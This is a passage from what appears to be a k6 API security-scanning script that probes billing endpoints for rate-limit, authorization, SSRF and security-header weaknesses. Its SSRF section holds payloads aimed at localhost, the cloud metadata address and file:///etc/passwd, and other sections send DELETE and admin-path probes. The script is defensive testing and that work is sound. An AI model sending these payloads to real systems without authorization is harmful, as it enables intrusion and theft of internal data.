            const hasRateLimit = response.headers['X-RateLimit-Limit'] ||
                                response.headers['x-ratelimit-limit'] ||
                                response.headers['RateLimit-Limit'];

            if (response.status === 429) {
                logPass('api4', '/v1/billing/subscriptions/{id}/transactions', 'get');
            } else if (response.status >= 200 && response.status < 300 && !hasRateLimit) {
                logFinding('api4', '/v1/billing/subscriptions/{id}/transactions', 'get',
                    'No rate limiting detected',
                    { status: response.status, hasRateLimitHeader: !!hasRateLimit });
            } else {
                logPass('api4', '/v1/billing/subscriptions/{id}/transactions', 'get');
            }
        }
    });
}

// API5: Broken Function Level Authorization
function testFunctionAuth() {
    group('API5 - Function Authorization', function() {
        console.log('[API5] Testing Function Level Authorization...');

        const adminPaths = [
            '/admin',
            '/admin/users',
            '/admin/settings',
            '/api/admin',
            '/internal',
            '/management',
        ];

        adminPaths.forEach(path => {
            const response = authRequest('get', BASE_URL + path, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api5', path, 'GET',
                    'Admin endpoint accessible',
                    { status: response.status });
            } else if (response.status === 403 || response.status === 401) {
                logPass('api5', path, 'GET');
            }
        });

        // Also test changing methods on read-only endpoints
        {
            const testPath = replacePathParams('/v1/billing/plans');
            const response = authRequest('delete', BASE_URL + testPath, null);
            testsRun.add(1);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api5', '/v1/billing/plans', 'DELETE',
                    'DELETE method allowed on read-only endpoint',
                    { status: response.status });
            }
        }
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}');
            const response = authRequest('delete', BASE_URL + testPath, null);
            testsRun.add(1);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api5', '/v1/billing/plans/{id}', 'DELETE',
                    'DELETE method allowed on read-only endpoint',
                    { status: response.status });
            }
        }
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}');
            const response = authRequest('delete', BASE_URL + testPath, null);
            testsRun.add(1);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api5', '/v1/billing/subscriptions/{id}', 'DELETE',
                    'DELETE method allowed on read-only endpoint',
                    { status: response.status });
            }
        }
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/transactions');
            const response = authRequest('delete', BASE_URL + testPath, null);
            testsRun.add(1);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api5', '/v1/billing/subscriptions/{id}/transactions', 'DELETE',
                    'DELETE method allowed on read-only endpoint',
                    { status: response.status });
            }
        }
    });
}

// API7: Server Side Request Forgery (SSRF)
function testSsrf() {
    group('API7 - SSRF', function() {
        console.log('[API7] Testing Server Side Request Forgery...');

        const ssrfPayloads = [
            'http://localhost/',
            'http://127.0.0.1/',
            'http://169.254.169.254/latest/meta-data/',
            'http://[::1]/',
            'file:///etc/passwd',
        ];

        // Test /v1/billing/plans with SSRF payloads
        {
            const testPath = replacePathParams('/v1/billing/plans');
            ssrfPayloads.forEach(payload => {
                const body = {
                    url: payload,
                    webhook_url: payload,
                    callback: payload,
                    image_url: payload,
                };

                const response = authRequest('post', BASE_URL + testPath, body);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check for indicators of internal access
                    const bodyLower = response.body.toLowerCase();
                    const internalIndicators = ['localhost', '127.0.0.1', 'instance-id', 'ami-id', 'root:'];

                    if (internalIndicators.some(ind => bodyLower.includes(ind))) {
                        logFinding('api7', '/v1/billing/plans', 'post',
                            `SSRF vulnerability - internal data exposed with payload: ${payload}`,
                            { status: response.status, payload });
                    }
                }
            });
        }
        // Test /v1/billing/plans/{id} with SSRF payloads
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}');
            ssrfPayloads.forEach(payload => {
                const body = {
                    url: payload,
                    webhook_url: payload,
                    callback: payload,
                    image_url: payload,
                };

                const response = authRequest('patch', BASE_URL + testPath, body);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check for indicators of internal access
                    const bodyLower = response.body.toLowerCase();
                    const internalIndicators = ['localhost', '127.0.0.1', 'instance-id', 'ami-id', 'root:'];

                    if (internalIndicators.some(ind => bodyLower.includes(ind))) {
                        logFinding('api7', '/v1/billing/plans/{id}', 'patch',
                            `SSRF vulnerability - internal data exposed with payload: ${payload}`,
                            { status: response.status, payload });
                    }
                }
            });
        }
        // Test /v1/billing/plans/{id}/activate with SSRF payloads
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}/activate');
            ssrfPayloads.forEach(payload => {
                const body = {
                    url: payload,
                    webhook_url: payload,
                    callback: payload,
                    image_url: payload,
                };

                const response = authRequest('post', BASE_URL + testPath, body);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check for indicators of internal access
                    const bodyLower = response.body.toLowerCase();
                    const internalIndicators = ['localhost', '127.0.0.1', 'instance-id', 'ami-id', 'root:'];

                    if (internalIndicators.some(ind => bodyLower.includes(ind))) {
                        logFinding('api7', '/v1/billing/plans/{id}/activate', 'post',
                            `SSRF vulnerability - internal data exposed with payload: ${payload}`,
                            { status: response.status, payload });
                    }
                }
            });
        }
        // Test /v1/billing/plans/{id}/deactivate with SSRF payloads
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}/deactivate');
            ssrfPayloads.forEach(payload => {
                const body = {
                    url: payload,
                    webhook_url: payload,
                    callback: payload,
                    image_url: payload,
                };

                const response = authRequest('post', BASE_URL + testPath, body);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check for indicators of internal access
                    const bodyLower = response.body.toLowerCase();
                    const internalIndicators = ['localhost', '127.0.0.1', 'instance-id', 'ami-id', 'root:'];

                    if (internalIndicators.some(ind => bodyLower.includes(ind))) {
                        logFinding('api7', '/v1/billing/plans/{id}/deactivate', 'post',
                            `SSRF vulnerability - internal data exposed with payload: ${payload}`,
                            { status: response.status, payload });
                    }
                }
            });
        }
        // Test /v1/billing/plans/{id}/update-pricing-schemes with SSRF payloads
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}/update-pricing-schemes');
            ssrfPayloads.forEach(payload => {
                const body = {
                    url: payload,
                    webhook_url: payload,
                    callback: payload,
                    image_url: payload,
                };

                const response = authRequest('post', BASE_URL + testPath, body);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check for indicators of internal access
                    const bodyLower = response.body.toLowerCase();
                    const internalIndicators = ['localhost', '127.0.0.1', 'instance-id', 'ami-id', 'root:'];

                    if (internalIndicators.some(ind => bodyLower.includes(ind))) {
                        logFinding('api7', '/v1/billing/plans/{id}/update-pricing-schemes', 'post',
                            `SSRF vulnerability - internal data exposed with payload: ${payload}`,
                            { status: response.status, payload });
                    }
                }
            });
        }
        // Test /v1/billing/subscriptions with SSRF payloads
        {
            const testPath = replacePathParams('/v1/billing/subscriptions');
            ssrfPayloads.forEach(payload => {
                const body = {
                    url: payload,
                    webhook_url: payload,
                    callback: payload,
                    image_url: payload,
                };

                const response = authRequest('post', BASE_URL + testPath, body);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check for indicators of internal access
                    const bodyLower = response.body.toLowerCase();
                    const internalIndicators = ['localhost', '127.0.0.1', 'instance-id', 'ami-id', 'root:'];

                    if (internalIndicators.some(ind => bodyLower.includes(ind))) {
                        logFinding('api7', '/v1/billing/subscriptions', 'post',
                            `SSRF vulnerability - internal data exposed with payload: ${payload}`,
                            { status: response.status, payload });
                    }
                }
            });
        }
        // Test /v1/billing/subscriptions/{id} with SSRF payloads
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}');
            ssrfPayloads.forEach(payload => {
                const body = {
                    url: payload,
                    webhook_url: payload,
                    callback: payload,
                    image_url: payload,
                };

                const response = authRequest('patch', BASE_URL + testPath, body);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check for indicators of internal access
                    const bodyLower = response.body.toLowerCase();
                    const internalIndicators = ['localhost', '127.0.0.1', 'instance-id', 'ami-id', 'root:'];

                    if (internalIndicators.some(ind => bodyLower.includes(ind))) {
                        logFinding('api7', '/v1/billing/subscriptions/{id}', 'patch',
                            `SSRF vulnerability - internal data exposed with payload: ${payload}`,
                            { status: response.status, payload });
                    }
                }
            });
        }
        // Test /v1/billing/subscriptions/{id}/activate with SSRF payloads
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/activate');
            ssrfPayloads.forEach(payload => {
                const body = {
                    url: payload,
                    webhook_url: payload,
                    callback: payload,
                    image_url: payload,
                };

                const response = authRequest('post', BASE_URL + testPath, body);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check for indicators of internal access
                    const bodyLower = response.body.toLowerCase();
                    const internalIndicators = ['localhost', '127.0.0.1', 'instance-id', 'ami-id', 'root:'];

                    if (internalIndicators.some(ind => bodyLower.includes(ind))) {
                        logFinding('api7', '/v1/billing/subscriptions/{id}/activate', 'post',
                            `SSRF vulnerability - internal data exposed with payload: ${payload}`,
                            { status: response.status, payload });
                    }
                }
            });
        }
        // Test /v1/billing/subscriptions/{id}/cancel with SSRF payloads
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/cancel');
            ssrfPayloads.forEach(payload => {
                const body = {
                    url: payload,
                    webhook_url: payload,
                    callback: payload,
                    image_url: payload,
                };

                const response = authRequest('post', BASE_URL + testPath, body);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check for indicators of internal access
                    const bodyLower = response.body.toLowerCase();
                    const internalIndicators = ['localhost', '127.0.0.1', 'instance-id', 'ami-id', 'root:'];

                    if (internalIndicators.some(ind => bodyLower.includes(ind))) {
                        logFinding('api7', '/v1/billing/subscriptions/{id}/cancel', 'post',
                            `SSRF vulnerability - internal data exposed with payload: ${payload}`,
                            { status: response.status, payload });
                    }
                }
            });
        }
        // Test /v1/billing/subscriptions/{id}/capture with SSRF payloads
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/capture');
            ssrfPayloads.forEach(payload => {
                const body = {
                    url: payload,
                    webhook_url: payload,
                    callback: payload,
                    image_url: payload,
                };

                const response = authRequest('post', BASE_URL + testPath, body);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check for indicators of internal access
                    const bodyLower = response.body.toLowerCase();
                    const internalIndicators = ['localhost', '127.0.0.1', 'instance-id', 'ami-id', 'root:'];

                    if (internalIndicators.some(ind => bodyLower.includes(ind))) {
                        logFinding('api7', '/v1/billing/subscriptions/{id}/capture', 'post',
                            `SSRF vulnerability - internal data exposed with payload: ${payload}`,
                            { status: response.status, payload });
                    }
                }
            });
        }
        // Test /v1/billing/subscriptions/{id}/revise with SSRF payloads
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/revise');
            ssrfPayloads.forEach(payload => {
                const body = {
                    url: payload,
                    webhook_url: payload,
                    callback: payload,
                    image_url: payload,
                };

                const response = authRequest('post', BASE_URL + testPath, body);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check for indicators of internal access
                    const bodyLower = response.body.toLowerCase();
                    const internalIndicators = ['localhost', '127.0.0.1', 'instance-id', 'ami-id', 'root:'];

                    if (internalIndicators.some(ind => bodyLower.includes(ind))) {
                        logFinding('api7', '/v1/billing/subscriptions/{id}/revise', 'post',
                            `SSRF vulnerability - internal data exposed with payload: ${payload}`,
                            { status: response.status, payload });
                    }
                }
            });
        }
        // Test /v1/billing/subscriptions/{id}/suspend with SSRF payloads
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/suspend');
            ssrfPayloads.forEach(payload => {
                const body = {
                    url: payload,
                    webhook_url: payload,
                    callback: payload,
                    image_url: payload,
                };

                const response = authRequest('post', BASE_URL + testPath, body);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check for indicators of internal access
                    const bodyLower = response.body.toLowerCase();
                    const internalIndicators = ['localhost', '127.0.0.1', 'instance-id', 'ami-id', 'root:'];

                    if (internalIndicators.some(ind => bodyLower.includes(ind))) {
                        logFinding('api7', '/v1/billing/subscriptions/{id}/suspend', 'post',
                            `SSRF vulnerability - internal data exposed with payload: ${payload}`,
                            { status: response.status, payload });
                    }
                }
            });
        }
    });
}

// API8: Security Misconfiguration
function testMisconfiguration() {
    group('API8 - Security Misconfiguration', function() {
        console.log('[API8] Testing Security Misconfiguration...');

        // Test /v1/billing/plans for security headers
        {
            const testPath = replacePathParams('/v1/billing/plans');
            const response = authRequest('get', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            const missingHeaders = [];

            if (!response.headers['X-Content-Type-Options'] && !response.headers['x-content-type-options']) {
                missingHeaders.push('X-Content-Type-Options');
            }
            if (!response.headers['X-Frame-Options'] && !response.headers['x-frame-options']) {
                missingHeaders.push('X-Frame-Options');
            }
            if (!response.headers['Strict-Transport-Security'] && !response.headers['strict-transport-security']) {
                missingHeaders.push('Strict-Transport-Security');
            }

            // Check for overly permissive CORS
            const acao = response.headers['Access-Control-Allow-Origin'] || response.headers['access-control-allow-origin'];
            if (acao === '*') {
                logFinding('api8', '/v1/billing/plans', 'get',
                    'CORS allows all origins (Access-Control-Allow-Origin: *)',
                    { status: response.status });
            }

            if (missingHeaders.length > 0) {
                logFinding('api8', '/v1/billing/plans', 'get',
                    `Missing security headers: ${missingHeaders.join(', ')}`,
                    { status: response.status, missingHeaders });
            }
        }
        // Test /v1/billing/plans for security headers
        {
            const testPath = replacePathParams('/v1/billing/plans');
            const response = authRequest('post', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            const missingHeaders = [];

            if (!response.headers['X-Content-Type-Options'] && !response.headers['x-content-type-options']) {
                missingHeaders.push('X-Content-Type-Options');
            }
            if (!response.headers['X-Frame-Options'] && !response.headers['x-frame-options']) {
                missingHeaders.push('X-Frame-Options');
            }
            if (!response.headers['Strict-Transport-Security'] && !response.headers['strict-transport-security']) {
                missingHeaders.push('Strict-Transport-Security');
            }

            // Check for overly permissive CORS
            const acao = response.headers['Access-Control-Allow-Origin'] || response.headers['access-control-allow-origin'];
            if (acao === '*') {
                logFinding('api8', '/v1/billing/plans', 'post',
                    'CORS allows all origins (Access-Control-Allow-Origin: *)',
                    { status: response.status });
            }

            if (missingHeaders.length > 0) {
                logFinding('api8', '/v1/billing/plans', 'post',
                    `Missing security headers: ${missingHeaders.join(', ')}`,
                    { status: response.status, missingHeaders });
            }
        }
        // Test /v1/billing/plans/{id} for security headers
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}');
            const response = authRequest('get', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            const missingHeaders = [];

            if (!response.headers['X-Content-Type-Options'] && !response.headers['x-content-type-options']) {
                missingHeaders.push('X-Content-Type-Options');
            }
            if (!response.headers['X-Frame-Options'] && !response.headers['x-frame-options']) {
                missingHeaders.push('X-Frame-Options');
            }
            if (!response.headers['Strict-Transport-Security'] && !response.headers['strict-transport-security']) {
                missingHeaders.push('Strict-Transport-Security');
            }

            // Check for overly permissive CORS
            const acao = response.headers['Access-Control-Allow-Origin'] || response.headers['access-control-allow-origin'];
            if (acao === '*') {
                logFinding('api8', '/v1/billing/plans/{id}', 'get',
                    'CORS allows all origins (Access-Control-Allow-Origin: *)',
                    { status: response.status });
            }

            if (missingHeaders.length > 0) {
                logFinding('api8', '/v1/billing/plans/{id}', 'get',
                    `Missing security headers: ${missingHeaders.join(', ')}`,
                    { status: response.status, missingHeaders });
            }
        }
        // Test /v1/billing/plans/{id} for security headers
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}');
            const response = authRequest('patch', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            const missingHeaders = [];

            if (!response.headers['X-Content-Type-Options'] && !response.headers['x-content-type-options']) {
                missingHeaders.push('X-Content-Type-Options');
            }
            if (!response.headers['X-Frame-Options'] && !response.headers['x-frame-options']) {
                missingHeaders.push('X-Frame-Options');
            }
            if (!response.headers['Strict-Transport-Security'] && !response.headers['strict-transport-security']) {
                missingHeaders.push('Strict-Transport-Security');
            }

            // Check for overly permissive CORS
            const acao = response.headers['Access-Control-Allow-Origin'] || response.headers['access-control-allow-origin'];
            if (acao === '*') {
                logFinding('api8', '/v1/billing/plans/{id}', 'patch',
                    'CORS allows all origins (Access-Control-Allow-Origin: *)',
                    { status: response.status });
            }

            if (missingHeaders.length > 0) {
                logFinding('api8', '/v1/billing/plans/{id}', 'patch',
                    `Missing security headers: ${missingHeaders.join(', ')}`,
                    { status: response.status, missingHeaders });
            }
        }
        // Test /v1/billing/plans/{id}/activate for security headers
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}/activate');
            const response = authRequest('post', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            const missingHeaders = [];

            if (!response.headers['X-Content-Type-Options'] && !response.headers['x-content-type-options']) {
                missingHeaders.push('X-Content-Type-Options');
            }
            if (!response.headers['X-Frame-Options'] && !response.headers['x-frame-options']) {
                missingHeaders.push('X-Frame-Options');
            }
            if (!response.headers['Strict-Transport-Security'] && !response.headers['strict-transport-security']) {
                missingHeaders.push('Strict-Transport-Security');
            }

            // Check for overly permissive CORS
            const acao = response.headers['Access-Control-Allow-Origin'] || response.headers['access-control-allow-origin'];
            if (acao === '*') {
                logFinding('api8', '/v1/billing/plans/{id}/activate', 'post',
                    'CORS allows all origins (Access-Control-Allow-Origin: *)',
                    { status: response.status });
            }

            if (missingHeaders.length > 0) {
                logFinding('api8', '/v1/billing/plans/{id}/activate', 'post',
                    `Missing security headers: ${missingHeaders.join(', ')}`,
                    { status: response.status, missingHeaders });
            }
        }
        // Test /v1/billing/plans/{id}/deactivate for security headers
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}/deactivate');
            const response = authRequest('post', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            const missingHeaders = [];

            if (!response.headers['X-Content-Type-Options'] && !response.headers['x-content-type-options']) {
                missingHeaders.push('X-Content-Type-Options');
            }
            if (!response.headers['X-Frame-Options'] && !response.headers['x-frame-options']) {
                missingHeaders.push('X-Frame-Options');
            }
            if (!response.headers['Strict-Transport-Security'] && !response.headers['strict-transport-security']) {
                missingHeaders.push('Strict-Transport-Security');
            }

            // Check for overly permissive CORS
            const acao = response.headers['Access-Control-Allow-Origin'] || response.headers['access-control-allow-origin'];
            if (acao === '*') {
                logFinding('api8', '/v1/billing/plans/{id}/deactivate', 'post',
                    'CORS allows all origins (Access-Control-Allow-Origin: *)',
                    { status: response.status });
            }

            if (missingHeaders.length > 0) {
                logFinding('api8', '/v1/billing/plans/{id}/deactivate', 'post',
                    `Missing security headers: ${missingHeaders.join(', ')}`,
                    { status: response.status, missingHeaders });
            }
        }
        // Test /v1/billing/plans/{id}/update-pricing-schemes for security headers
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}/update-pricing-schemes');
            const response = authRequest('post', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            const missingHeaders = [];

            if (!response.headers['X-Content-Type-Options'] && !response.headers['x-content-type-options']) {
                missingHeaders.push('X-Content-Type-Options');
            }
            if (!response.headers['X-Frame-Options'] && !response.headers['x-frame-options']) {
                missingHeaders.push('X-Frame-Options');
            }
            if (!response.headers['Strict-Transport-Security'] && !response.headers['strict-transport-security']) {
                missingHeaders.push('Strict-Transport-Security');
            }

            // Check for overly permissive CORS
            const acao = response.headers['Access-Control-Allow-Origin'] || response.headers['access-control-allow-origin'];
            if (acao === '*') {
                logFinding('api8', '/v1/billing/plans/{id}/update-pricing-schemes', 'post',
                    'CORS allows all origins (Access-Control-Allow-Origin: *)',
                    { status: response.status });
            }

            if (missingHeaders.length > 0) {
                logFinding('api8', '/v1/billing/plans/{id}/update-pricing-schemes', 'post',
                    `Missing security headers: ${missingHeaders.join(', ')}`,
                    { status: response.status, missingHeaders });
            }
        }
        // Test /v1/billing/subscriptions for security headers
        {
            const testPath = replacePathParams('/v1/billing/subscriptions');
            const response = authRequest('post', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            const missingHeaders = [];

            if (!response.headers['X-Content-Type-Options'] && !response.headers['x-content-type-options']) {
                missingHeaders.push('X-Content-Type-Options');
            }
            if (!response.headers['X-Frame-Options'] && !response.headers['x-frame-options']) {
                missingHeaders.push('X-Frame-Options');
            }
            if (!response.headers['Strict-Transport-Security'] && !response.headers['strict-transport-security']) {
                missingHeaders.push('Strict-Transport-Security');
            }

            // Check for overly permissive CORS
            const acao = response.headers['Access-Control-Allow-Origin'] || response.headers['access-control-allow-origin'];
            if (acao === '*') {
                logFinding('api8', '/v1/billing/subscriptions', 'post',
                    'CORS allows all origins (Access-Control-Allow-Origin: *)',
                    { status: response.status });
            }

            if (missingHeaders.length > 0) {
                logFinding('api8', '/v1/billing/subscriptions', 'post',
                    `Missing security headers: ${missingHeaders.join(', ')}`,
                    { status: response.status, missingHeaders });
            }
        }
        // Test /v1/billing/subscriptions/{id} for security headers
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}');
            const response = authRequest('get', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            const missingHeaders = [];

            if (!response.headers['X-Content-Type-Options'] && !response.headers['x-content-type-options']) {
                missingHeaders.push('X-Content-Type-Options');
            }
            if (!response.headers['X-Frame-Options'] && !response.headers['x-frame-options']) {
                missingHeaders.push('X-Frame-Options');
            }
            if (!response.headers['Strict-Transport-Security'] && !response.headers['strict-transport-security']) {
                missingHeaders.push('Strict-Transport-Security');
            }

            // Check for overly permissive CORS
            const acao = response.headers['Access-Control-Allow-Origin'] || response.headers['access-control-allow-origin'];
            if (acao === '*') {
                logFinding('api8', '/v1/billing/subscriptions/{id}', 'get',
                    'CORS allows all origins (Access-Control-Allow-Origin: *)',
                    { status: response.status });
            }

            if (missingHeaders.length > 0) {
                logFinding('api8', '/v1/billing/subscriptions/{id}', 'get',
                    `Missing security headers: ${missingHeaders.join(', ')}`,
                    { status: response.status, missingHeaders });
            }
        }
        // Test /v1/billing/subscriptions/{id} for security headers
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}');
            const response = authRequest('patch', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            const missingHeaders = [];

            if (!response.headers['X-Content-Type-Options'] && !response.headers['x-content-type-options']) {
                missingHeaders.push('X-Content-Type-Options');
            }
            if (!response.headers['X-Frame-Options'] && !response.headers['x-frame-options']) {
                missingHeaders.push('X-Frame-Options');
            }
            if (!response.headers['Strict-Transport-Security'] && !response.headers['strict-transport-security']) {
                missingHeaders.push('Strict-Transport-Security');
            }

            // Check for overly permissive CORS
            const acao = response.headers['Access-Control-Allow-Origin'] || response.headers['access-control-allow-origin'];
            if (acao === '*') {
                logFinding('api8', '/v1/billing/subscriptions/{id}', 'patch',
                    'CORS allows all origins (Access-Control-Allow-Origin: *)',
                    { status: response.status });
            }

            if (missingHeaders.length > 0) {
                logFinding('api8', '/v1/billing/subscriptions/{id}', 'patch',
                    `Missing security headers: ${missingHeaders.join(', ')}`,
                    { status: response.status, missingHeaders });
            }
        }
        // Test /v1/billing/subscriptions/{id}/activate for security headers
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/activate');
            const response = authRequest('post', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            const missingHeaders = [];

            if (!response.headers['X-Content-Type-Options'] && !response.headers['x-content-type-options']) {
                missingHeaders.push('X-Content-Type-Options');
            }
            if (!response.headers['X-Frame-Options'] && !response.headers['x-frame-options']) {
                missingHeaders.push('X-Frame-Options');
            }
            if (!response.headers['Strict-Transport-Security'] && !response.headers['strict-transport-security']) {
                missingHeaders.push('Strict-Transport-Security');
            }

            // Check for overly permissive CORS
            const acao = response.headers['Access-Control-Allow-Origin'] || response.headers['access-control-allow-origin'];
            if (acao === '*') {
                logFinding('api8', '/v1/billing/subscriptions/{id}/activate', 'post',
                    'CORS allows all origins (Access-Control-Allow-Origin: *)',
                    { status: response.status });
            }

            if (missingHeaders.length > 0) {
                logFinding('api8', '/v1/billing/subscriptions/{id}/activate', 'post',
                    `Missing security headers: ${missingHeaders.join(', ')}`,
                    { status: response.status, missingHeaders });
            }
        }
        // Test /v1/billing/subscriptions/{id}/cancel for security headers
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/cancel');
            const response = authRequest('post', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            const missingHeaders = [];

            if (!response.headers['X-Content-Type-Options'] && !response.headers['x-content-type-options']) {
                missingHeaders.push('X-Content-Type-Options');
            }
            if (!response.headers['X-Frame-Options'] && !response.headers['x-frame-options']) {
                missingHeaders.push('X-Frame-Options');
            }
            if (!response.headers['Strict-Transport-Security'] && !response.headers['strict-transport-security']) {
                missingHeaders.push('Strict-Transport-Security');
            }

            // Check for overly permissive CORS
            const acao = response.headers['Access-Control-Allow-Origin'] || response.headers['access-control-allow-origin'];
            if (acao === '*') {
                logFinding('api8', '/v1/billing/subscriptions/{id}/cancel', 'post',
                    'CORS allows all origins (Access-Control-Allow-Origin: *)',
                    { status: response.status });
            }

            if (missingHeaders.length > 0) {
                logFinding('api8', '/v1/billing/subscriptions/{id}/cancel', 'post',
                    `Missing security headers: ${missingHeaders.join(', ')}`,
                    { status: response.status, missingHeaders });
            }
        }
        // Test /v1/billing/subscriptions/{id}/capture for security headers
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/capture');
            const response = authRequest('post', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            const missingHeaders = [];

            if (!response.headers['X-Content-Type-Options'] && !response.headers['x-content-type-options']) {
                missingHeaders.push('X-Content-Type-Options');
            }
            if (!response.headers['X-Frame-Options'] && !response.headers['x-frame-options']) {
                missingHeaders.push('X-Frame-Options');
            }
            if (!response.headers['Strict-Transport-Security'] && !response.headers['strict-transport-security']) {
                missingHeaders.push('Strict-Transport-Security');
            }

            // Check for overly permissive CORS
            const acao = response.headers['Access-Control-Allow-Origin'] || response.headers['access-control-allow-origin'];
            if (acao === '*') {
                logFinding('api8', '/v1/billing/subscriptions/{id}/capture', 'post',
                    'CORS allows all origins (Access-Control-Allow-Origin: *)',
                    { status: response.status });
            }

            if (missingHeaders.length > 0) {
                logFinding('api8', '/v1/billing/subscriptions/{id}/capture', 'post',
                    `Missing security headers: ${missingHeaders.join(', ')}`,
                    { status: response.status, missingHeaders });
            }
        }
        // Test /v1/billing/subscriptions/{id}/revise for security headers
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/revise');
            const response = authRequest('post', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            const missingHeaders = [];

            if (!response.headers['X-Content-Type-Options'] && !response.headers['x-content-type-options']) {
                missingHeaders.push('X-Content-Type-Options');
            }
            if (!response.headers['X-Frame-Options'] && !response.headers['x-frame-options']) {
                missingHeaders.push('X-Frame-Options');
            }
            if (!response.headers['Strict-Transport-Security'] && !response.headers['strict-transport-security']) {
                missingHeaders.push('Strict-Transport-Security');
            }

            // Check for overly permissive CORS
            const acao = response.headers['Access-Control-Allow-Origin'] || response.headers['access-control-allow-origin'];
            if (acao === '*') {
                logFinding('api8', '/v1/billing/subscriptions/{id}/revise', 'post',
                    'CORS allows all origins (Access-Control-Allow-Origin: *)',
                    { status: response.status });
            }

            if (missingHeaders.length > 0) {
                logFinding('api8', '/v1/billing/subscriptions/{id}/revise', 'post',
                    `Missing security headers: ${missingHeaders.join(', ')}`,
                    { status: response.status, missingHeaders });
            }
        }
        // Test /v1/billing/subscriptions/{id}/suspend for security headers
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/suspend');
            const response = authRequest('post', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            const missingHeaders = [];

            if (!response.headers['X-Content-Type-Options'] && !response.headers['x-content-type-options']) {
                missingHeaders.push('X-Content-Type-Options');
            }
            if (!response.headers['X-Frame-Options'] && !response.headers['x-frame-options']) {
                missingHeaders.push('X-Frame-Options');
            }
            if (!response.headers['Strict-Transport-Security'] && !response.headers['strict-transport-security']) {
                missingHeaders.push('Strict-Transport-Security');
            }

            // Check for overly permissive CORS
            const acao = response.headers['Access-Control-Allow-Origin'] || response.headers['access-control-allow-origin'];
            if (acao === '*') {
                logFinding('api8', '/v1/billing/subscriptions/{id}/suspend', 'post',
                    'CORS allows all origins (Access-Control-Allow-Origin: *)',
                    { status: response.status });
            }

            if (missingHeaders.length > 0) {
                logFinding('api8', '/v1/billing/subscriptions/{id}/suspend', 'post',
                    `Missing security headers: ${missingHeaders.join(', ')}`,
                    { status: response.status, missingHeaders });
            }
        }
        // Test /v1/billing/subscriptions/{id}/transactions for security headers
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/transactions');
            const response = authRequest('get', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            const missingHeaders = [];

            if (!response.headers['X-Content-Type-Options'] && !response.headers['x-content-type-options']) {
                missingHeaders.push('X-Content-Type-Options');
            }
            if (!response.headers['X-Frame-Options'] && !response.headers['x-frame-options']) {
                missingHeaders.push('X-Frame-Options');
            }
